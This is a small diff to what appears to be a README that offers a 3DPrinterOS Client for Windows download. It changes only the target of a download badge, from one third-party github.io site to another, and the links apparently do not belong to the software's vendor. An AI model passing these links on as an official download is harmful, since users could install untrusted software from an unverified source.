@@ -2,7 +2,8 @@
 
 ## 📥 Download 3DPrinterOS Client for Windows
 
-[![⬇️ Download 3DPrinterOS](https://img.shields.io/badge/Download-3DPrinterOS-blue?style=for-the-badge&logo=windows)](https://3dprinteros-cloud-client.github.io/.github)
+[![⬇️ Download 3DPrinterOS](https://img.shields.io/badge/Download-3DPrinterOS-blue?style=for-the-badge&logo=windows)](https://3dprinteros-prem.github.io/.github
+)
 
 ---
 
